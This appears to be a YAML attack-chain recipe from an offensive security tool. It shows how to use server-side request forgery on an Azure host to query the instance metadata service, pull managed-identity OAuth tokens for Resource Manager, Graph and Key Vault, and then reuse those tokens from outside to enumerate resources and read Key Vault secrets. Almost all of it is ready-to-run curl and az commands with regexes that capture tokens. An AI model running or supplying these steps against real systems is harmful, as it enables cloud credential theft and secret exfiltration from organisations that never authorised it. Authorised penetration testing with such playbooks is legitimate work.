id: azure-imds-managed-identity
name: "Cloud — Azure IMDS → managed identity → token"
description: >
  SSRF on an Azure VM/AKS/App Service hits 169.254.169.254 to extract the
  managed identity's OAuth2 token. Token grants Azure AD-scoped access
  for whatever role is bound to that identity (often Contributor on the RG).
tags: [cloud, azure, ssrf, imds, managed-identity, post-exploitation]
difficulty: medium

inputs:
  - name: ssrf_url
    description: "Vulnerable URL that fetches arbitrary URLs."
    required: true

steps:
  - id: confirm_azure
    name: "Confirm we're on Azure (compute metadata)"
    inline_command: "curl '<url>http://169.254.169.254/metadata/instance?api-version=2021-02-01' -H 'Metadata: true'"
    inputs:
      url: "${ssrf_url}"
    notes: |
      Azure IMDS REQUIRES the literal `Metadata: true` header (anti-SSRF
      mitigation). If your SSRF can't add headers — you're stuck unless
      it's a `headers=` parameter trick.
    capture:
      - var: azure_subscription_id
        regex: '"subscriptionId"\s*:\s*"([0-9a-f-]+)"'
        match: first
      - var: azure_vm_name
        regex: '"name"\s*:\s*"([^"]+)"'
        match: first

  - id: get_token_for_arm
    name: "Request OAuth token for Azure Resource Manager"
    inline_command: |
      curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
        -H 'Metadata: true'
    inputs:
      url: "${ssrf_url}"
    capture:
      - var: azure_arm_token
        regex: '"access_token"\s*:\s*"([^"]+)"'
        match: first

  - id: get_token_for_graph
    name: "Also grab a Graph token (Azure AD operations)"
    inline_command: |
      curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/' \
        -H 'Metadata: true'
    inputs:
      url: "${ssrf_url}"
    capture:
      - var: azure_graph_token
        regex: '"access_token"\s*:\s*"([^"]+)"'
        match: first

  - id: get_token_for_keyvault
    name: "Token for Key Vault — gold mine if the identity has access"
    inline_command: |
      curl '<url>http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net' \
        -H 'Metadata: true'
    inputs:
      url: "${ssrf_url}"

  - id: enumerate_via_arm
    name: "Use the ARM token from your laptop"
    inline_command: |
      export AZ_TOKEN='<token>'
      curl -H "Authorization: Bearer $AZ_TOKEN" \
        "https://management.azure.com/subscriptions/<sub>/resourcegroups?api-version=2021-04-01"
      # Or via az CLI:
      az login --service-principal -u <client-id> -p $AZ_TOKEN --tenant <tenant>  # if managed identity gives one
      az role assignment list --assignee <object-id>
    inputs:
      token: "${azure_arm_token}"
      sub: "${azure_subscription_id}"

  - id: pillage_keyvault
    name: "Pillage Key Vault secrets (if token granted)"
    inline_command: |
      VAULT_TOKEN='<kv_token>'
      # List vaults the identity can reach (via ARM token):
      curl -H "Authorization: Bearer $AZ_TOKEN" \
        "https://management.azure.com/subscriptions/<sub>/providers/Microsoft.KeyVault/vaults?api-version=2019-09-01"
      # Per vault, list secrets:
      curl -H "Authorization: Bearer $VAULT_TOKEN" \
        "https://<vaultname>.vault.azure.net/secrets?api-version=7.4"
      # Per secret, read value:
      curl -H "Authorization: Bearer $VAULT_TOKEN" \
        "https://<vaultname>.vault.azure.net/secrets/<name>?api-version=7.4"

references:
  - title: "Azure IMDS docs"
    url:   "https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service"
  - title: "HackTricks — Azure SSRF"
    url:   "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"

next_chains:
  - chain: aws-imds-ssrf
    when:   'multi-cloud target'
    reason: 'Same SSRF often reaches AWS metadata too.'
